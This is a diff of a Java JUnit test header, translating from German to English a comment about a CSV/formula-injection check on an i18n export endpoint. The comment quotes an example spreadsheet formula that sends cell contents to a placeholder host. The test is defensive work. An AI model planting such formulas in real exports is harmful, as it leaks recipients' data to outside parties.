@@ -14,13 +14,13 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
- * SECURITY (Karte 314, Punkt 15) — CSV-/Formula-Injection im i18n-Export.
+ * SECURITY (card 314, item 15) — CSV/formula injection in the i18n export.
  *
- * <p>Uebersetzungstexte sind von Administratoren frei befuellbar und landen ueber
- * {@code GET /api/i18n/export} in einer CSV-Datei. Beginnt ein Wert mit {@code =}, {@code +},
- * {@code -} oder {@code @}, interpretieren Excel, LibreOffice und Google Sheets die Zelle beim
- * Oeffnen als FORMEL — ein Text wie {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")}
- * exfiltriert dann Zellinhalte oder startet externe Aufrufe auf dem Rechner des Empfaengers.
+ * <p>Translation texts can be filled in freely by administrators and end up in a CSV file through
+ * {@code GET /api/i18n/export}. If a value starts with {@code =}, {@code +},
+ * {@code -} or {@code @}, Excel, LibreOffice and Google Sheets interpret the cell as a FORMULA when
+ * it is opened — a text such as {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")}
+ * then exfiltrates cell contents or starts external calls on the recipient's machine.
  */
 @DisplayName("I18n-Export: CSV-Injection")
 class I18nCsvInjectionTest {
